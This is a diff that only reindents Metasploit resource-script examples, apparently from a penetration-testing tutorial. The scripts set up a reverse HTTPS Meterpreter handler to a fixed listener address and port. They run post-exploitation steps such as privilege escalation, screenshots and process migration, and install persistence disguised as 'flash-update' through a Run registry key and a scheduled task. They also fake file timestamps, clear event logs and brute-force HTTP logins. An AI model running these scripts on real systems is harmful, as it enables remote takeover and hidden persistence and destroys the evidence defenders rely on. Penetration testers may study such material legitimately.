@@ -74,10 +74,10 @@
 
 ```
    use exploit/multi/handler
-      set PAYLOAD windows/meterpreter/reverse_https
-      set ExitOnSession false
-      set LHOST 192.168.1.71
-      set LPORT 666
+   set PAYLOAD windows/meterpreter/reverse_https
+   set ExitOnSession false
+   set LHOST 192.168.1.71
+   set LPORT 666
    exploit
 ```
 `[run]` msfconsole -r /root/handler.rc
@@ -107,10 +107,10 @@
 
 ```
    spool /root/logfile.log
-      version
-      sessions -v
-      loadpath /root/msf-auxiliarys
-      resource /root/handler.rc
+   version
+   sessions -v
+     loadpath /root/msf-auxiliarys
+     resource /root/handler.rc
    makerc /root/commands.rc
 ```
 `[run]` msfconsole -r /root/record.rc
@@ -135,10 +135,10 @@
    getsystem
    screenshot
    migrate -n wininit.exe
-      use post/windows/gather/enum_applications
-      run
-      use post/multi/recon/local_exploit_suggester
-      run
+     use post/windows/gather/enum_applications
+   run
+     use post/multi/recon/local_exploit_suggester
+   run
 ```
 `[run] meterpreter >` resource /root/post.rc
 
@@ -154,7 +154,7 @@
    migrate -n explorer.exe
       upload update.exe %temp%\\update.exe
       timestomp -z '3/10/1999 15:15:15' %temp%\\update.exe
-         reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
+      reg setval -k HKLM\\Software\\Microsoft\\Windows\\Currentversion\\Run -v flash-update -d %temp%\\update.exe
       scheduleme -m 10 -c "%temp%\\update.exe"
    clearev
 ```
@@ -167,17 +167,15 @@
 - **Using SETG global variable to config auxiliary(s) modules options::**`[script: http_brute.rc]`<br />
 
 ```
-setg THREADS 15
-setg RHOSTS 192.168.1.254
-
-   use auxiliary/scanner/http/http_version
+   setg THREADS 15
+   setg RHOSTS 192.168.1.254
+     use auxiliary/scanner/http/http_version
    run
-   use auxiliary/scanner/http/dir_scanner
+     use auxiliary/scanner/http/dir_scanner
    run
-   use auxiliary/scanner/http/http_login
+     use auxiliary/scanner/http/http_login
    run
-
-unsetg RHOSTS THREADS
+   unsetg RHOSTS THREADS
 ```
 `[run]` msfconsole -r /root/http_brute.rc
 
@@ -200,23 +198,21 @@ unsetg RHOSTS THREADS
    sysinfo
    getuid
    services
-      sessions -v
+   sessions -v
 ```
 
 - **RC::AutoRunScript::Handler::**`[script: post_handler.rc]`<br />
 
 ```
-setg RESOURCE /root/gather.rc
-
-   use exploit/multi/handler
-   set AutoRunScript post/multi/gather/multi_command
-   set PAYLOAD windows/meterpreter/reverse_https
-   set ExitOnSession false
-   set LHOST 192.168.1.71
-   set LPORT 666
+   setg RESOURCE /root/gather.rc
+      use exploit/multi/handler
+      set AutoRunScript post/multi/gather/multi_command
+      set PAYLOAD windows/meterpreter/reverse_https
+      set ExitOnSession false
+      set LHOST 192.168.1.71
+      set LPORT 666
    exploit
-
-unsetg RESOURCE
+   unsetg RESOURCE
 ```
 `[run]` msfconsole -r /root/post_handler.rc
 
